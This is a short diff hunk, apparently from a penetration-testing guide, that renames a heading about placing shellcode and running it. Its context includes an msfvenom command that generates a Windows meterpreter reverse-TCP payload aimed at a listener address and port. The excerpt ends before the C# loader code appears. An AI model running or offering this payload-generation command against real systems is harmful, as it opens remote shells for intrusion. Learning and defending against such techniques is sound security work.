@@ -102,7 +102,7 @@ self.close();
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.36 LPORT=3333 -f csharp 
 ```
 
-## Place shellcode into XOR
+## Place shellcode in and run
 
 ```csharp
 using System;
